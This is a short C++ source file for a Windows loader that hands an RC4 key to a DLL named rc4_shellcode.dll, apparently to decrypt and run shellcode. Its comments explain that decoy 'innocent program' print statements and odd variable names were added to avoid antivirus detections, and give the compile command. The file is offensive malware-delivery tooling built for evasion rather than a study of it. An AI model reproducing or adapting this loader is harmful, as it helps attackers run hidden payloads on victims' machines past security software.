/*
x86_64-w64-mingw32-g++ -s -o loader.exe example_exe.cpp -L. -l:rc4_shellcode.dll -static-libgcc

This actually calls the function in the DLL.
I'm not sure why, but adding the "innocence" print statements tipped
this one over the edge. Previously, we were getting some detections.
*/

#include "rc4_enc_dll.hpp"
#include <iostream>

//This is the key.
unsigned char cadab[] = "RC4 KEY GOES HERE RC4 KEY GOES H";
//This is the length of the key. The current one has length 32.
//If you mess it up, it could be bad. Count carefully.
int ra = 32;
/*
* Example:
* unsigned char cadab[] = "kRlOQ56XUCYinhamVD0jZozgHqPNSIn2";
* int ra = 32;
*/


int main(void) {
   //Some nice print statements. Might want to change the text though.
   std::cout << "This is an innocent program!" << std::endl;
   std::cout << "Calling a function!" << std::endl;
   //Yes, I did use odd variable names just so I could do this.
   abra(cadab, ra);
   //Unreachable (I think), but what do I care?
   std::cout << "Function called! We did it." << std::endl;
   return 0;
}
